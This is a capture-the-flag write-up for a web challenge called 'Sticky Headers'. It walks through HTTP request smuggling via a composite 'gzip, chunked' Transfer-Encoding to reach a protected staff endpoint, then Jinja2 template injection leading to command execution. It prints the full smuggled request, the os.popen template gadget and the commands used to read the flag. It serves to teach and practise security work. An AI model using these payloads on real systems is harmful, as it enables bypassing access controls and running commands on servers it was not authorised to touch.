# Sticky Headers - writeup (HTTP request smuggling + Jinja2 SSTI)

## Getting to know the task

No source was given - only a live instance. So the first step is reconnaissance: find the endpoints, learn what each one does, and look at the description hint.

The site is a candy shop. Two roles:

- **public** `/order` - `POST /order` places an order (`message=...`) and returns "Order received!".
- **staff** `/staff/preview` - renders a template from the `message` field, but a direct request returns **403**.

The hint from the challenge: *"Older couriers may describe delivery contents using more than one encoding."* Combined with the title **Sticky Headers**, this points to HTTP request smuggling: someone in front of the staff endpoint parses requests differently from the staff service, and a composite encoding (more than one `Transfer-Encoding`) is the classic way to make two parsers disagree.

## What I used (tools)

- `nc` / a small Python client over TLS - to talk to the instance and see raw responses.
- Custom probe scripts (`scripts/`) - to brute-force which `X-Client-Version` + `Transfer-Encoding` combination makes the two parsers disagree, and to batch-run template expressions.
- Manual requests - for the direct-endpoint behavior (403/404).

## Step 1: reach `/staff/preview` through smuggling

### What "smuggling" means here

HTTP request smuggling: the connection goes through two parsers in a chain - a front proxy and the internal service. Both parse the same bytes, but if they disagree on where the first request ends, a second request can be hidden inside the first one. The front proxy never sees it, so it passes no check the proxy applies; the backend reads it as a fresh, legitimate request and answers it. "Smuggling" is exactly that - delivering a request the front gate did not approve, hidden inside an approved one.

### The desync: `X-Client-Version: 1` + `Transfer-Encoding: gzip, chunked`

A direct `POST /staff/preview` returns `403` - the staff endpoint checks something (probably the client role / `X-Client-Version` header).

The discovery: with **`X-Client-Version: 1`** plus a composite **`Transfer-Encoding: gzip, chunked`** on the **first** request to `/order`, the server processes a **second HTTP request** on the same connection. So we can smuggle a fresh request to `/staff/preview` and get a `200`.

Why it works: the front proxy sees `Transfer-Encoding: gzip, chunked` and (not supporting gzip) finishes the body at the chunked framing; the internal service interprets the composite TE differently and treats the bytes after the first body as the start of the next request. Result: two requests in one connection, and the second lands on the staff handler without the staff check.

The trigger header matters: with `X-Client-Version: 2` (or without it), the second request is NOT processed. `X-Client-Version: 1` is the "legacy client" path the front proxy handles differently (that is also what "older couriers" hints at).

### The exact working request

Reproduced byte-for-byte from probe #070, kept in `evidence/smuggle_working_070.request`:

```text
POST /order HTTP/1.1
Host: <host>
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Transfer-Encoding: gzip, chunked

B
order=hello
0

POST /staff/preview HTTP/1.1
Host: <host>
Connection: keep-alive
X-Client-Version: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

message=%7B%7B7%2A7%7D%7D
```

Notes:
- First request: chunked body `order=hello`, then the chunked terminator `0\r\n\r\n`; the inner request is appended after the trailer.
- `B` is the chunk size: 0xB = 11 = the length of `order=hello`.
- The inner request reaches the internal handler (`BaseHTTP/0.6 Python/3.12.15` per the server banner).

Result: two responses on one connection:

```text
HTTP/1.1 200 OK   Order received!           (443 B)
HTTP/1.0 200 OK   Staff template preview    (740 B)   .preview = 49
```

The second response rendered `{{7*7}}` as `49` - we reached the template engine. (Captured in `evidence/smuggle_working_070.response`.)

Confirmed behaviors (from probing):

- `X-Client-Version: 1` + `TE: gzip, chunked`, inner POST `message=...` - two responses, staff renders
- `X-Client-Version: 2`, inner POST - one response only, no staff
- direct `/staff/preview` - 403
- inner GET `/staff/preview` - 404

## Step 2: the template engine is Jinja2 (SSTI)

### What SSTI is

SSTI (Server-Side Template Injection) - a bug class where user input is embedded into a template on the server and rendered by a template engine. If the engine evaluates `{{...}}` expressions inside that input, the attacker can run arbitrary expressions in the engine's object model; with Jinja2 that leads to calling Python functions, i.e. code execution.

### How I probed the engine (and with what)

The staff renderer renders our `message` as a template. Every test expression was sent in the `message=` field of the smuggled request, and the rendered output was read from the `<div class="preview">` of the second response. The expressions were batch-run with `sticky_staff_inspector.py`, which saves the results (they are in `evidence/staff_inspector_summary.json`); a single probe can be replayed with the client's `--expr` mode.

Expression - output:

- `{{7*7}}` - `49`
- `{{4+5}}`, `{{9-5}}`, `{{9/3}}`, `{{9%4}}`, `{{2**5}}` - `9`, `4`, `3.0`, `1`, `32`
- `{{"abc".upper()}}` - `ABC`
- `{{"foo".replace("o","i")}}` - `fii`
- `{{().__class__.__mro__}}` - `(<class 'tuple'>, <class 'object'>)`
- `{{cycler}}` - `jinja2.utils.Cycler`
- `{{cycler.__init__.__globals__.os}}` - the `os` module
- `{{cycler.__init__.__globals__.os.getcwd()}}` - `/challenge`
- `{{cycler.__init__.__globals__.os.listdir("/challenge")}}` - `['src']`

The arithmetic and method calls show that expressions are evaluated; `{{cycler}}` resolving to `jinja2.utils.Cycler` identifies the engine as **Jinja2** and gives us the handle.

### The RCE gadget (and where it comes from)

```text
{{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
```

This chain is the standard, widely documented Jinja2 SSTI technique (PortSwigger's Web Security Academy "server-side template injection" topic and public Jinja2 SSTI cheat-sheets). I recognized it from there and confirmed each link live: `cycler` is a built-in global Jinja2 exposes in templates; `.__init__` of that object, then `.__globals__`, gives the module's globals dict, which contains `os`; `os.popen(cmd).read()` runs a shell command and returns its output.

### Finding and reading the flag

First, list the root and search for the recipe file:

```text
{{cycler.__init__.__globals__.os.popen("find / -name recipe.txt").read()}}
```

output:

```text
/opt/candy/recipe.txt
/tmp/recipe.txt
```

`/opt/candy/recipe.txt` is a symlink to `/tmp/recipe.txt`. Reading it:

```text
{{cycler.__init__.__globals__.os.popen("cat /opt/candy/recipe.txt").read()}}
```

output: `FortID{1_C4NT_5H4K3_TH15_H34D3R_...}` (masked)

The flag is in `/opt/candy/recipe.txt` (a symlink to `/tmp/recipe.txt`), themed as the "candy recipe".

## The working client

The final client (smuggling + SSTI, gets the flag) is in `scripts/solve.py` - no third-party dependencies, TLS from the stdlib. Usage:

```bash
python3 scripts/solve.py <host> 1337        # control {{7*7}}, then find, then cat - flag
python3 scripts/solve.py <host> --expr '{{7*7}}'
python3 scripts/solve.py <host> --cmd 'id'
```

It builds the exact two-request payload (`build_request()`), sends it over one TLS connection, extracts the `<div class="preview">` output, and runs the `find` + `cat` sequence. Verified offline: `build_request()` reproduces the evidence request content (up to the CRLF/LF style).

## Verification

The instance is closed after the event, so a live run is currently impossible. What is proven:

- `evidence/smuggle_working_070.request` - the working smuggled request, captured on the live instance (saved with LF line endings; the script emits the same content with CRLF).
- `evidence/smuggle_working_070.response` - two HTTP responses on one connection; the second is the staff page with `preview">49`, i.e. the smuggled request reached the template renderer.
- `evidence/staff_inspector_summary.json` - the collected confirmations of SSTI expressions (arithmetic, method calls, globals, the `os` module).

## Dead ends (what I tried first)

1. **Direct request to `/staff/preview`.** Returns `403` - the staff endpoint rejects direct clients; that is the whole point of the smuggling.
2. **`X-Client-Version: 2`.** The front proxy does not process the second request; only the legacy `1` path has the parsing disagreement.
3. **Inner GET to `/staff/preview`.** Returns 404 - the staff endpoint only accepts POST with a `message` body.
4. **`Transfer-Encoding: chunked` alone.** No desync; the composite `gzip, chunked` is what makes the parsers disagree.

## One-paragraph version

Sticky Headers is a web challenge with a protected `/staff/preview` (returns 403) that renders a Jinja2 template from our `message`. Using `X-Client-Version: 1` plus a composite `Transfer-Encoding: gzip, chunked` on a public `/order` request, the front proxy and the internal service disagree about the body, so a second request smuggled in the same connection reaches `/staff/preview` and renders (proof: `{{7*7}}` = 49 in the second response). The renderer is Jinja2, so the classic gadget `{{cycler.__init__.__globals__.os.popen(<CMD>).read()}}` gives RCE: `find / -name recipe.txt` locates `/opt/candy/recipe.txt` (symlink to `/tmp/recipe.txt`), and `cat` on it returns the flag.

## Lessons learned

1. A composite `Transfer-Encoding` (`gzip, chunked`) is a reliable request-smuggling primitive when a front proxy and a backend disagree about it; the "legacy client" header (`X-Client-Version: 1`) was the trigger that enabled the desync.
2. When an endpoint renders user input, always probe the template engine first (`{{7*7}}`, `.upper()`, `cycler`) - the answer tells you the whole exploitation path (here Jinja2, then SSTI, then RCE).
3. The classic Jinja2 gadget `{{<builtin>.__init__.__globals__.os.popen(<cmd>).read()}}` is the fastest route from template injection to code execution.
4. Byte-exact evidence matters: saving the exact working request (probe #070) makes the exploit reproducible offline and after the instance dies.
5. The hint ("more than one encoding") was literal: the composite TE header is the vulnerability. Read the flavor text as a technical pointer.

## Files

- `scripts/solve.py` - the final client: smuggling + SSTI (host [port] / --expr / --cmd)
- `scripts/sticky_staff_inspector.py` - batch-probing SSTI expressions, collecting confirmations
- `scripts/sticky_headers_desync.py` - checking the TE-header desync
- `scripts/sticky_headers_v1_probe.py` - brute-forcing X-Client-Version / TE variants (found #070)
- `evidence/` - the working request, its response, the SSTI confirmation data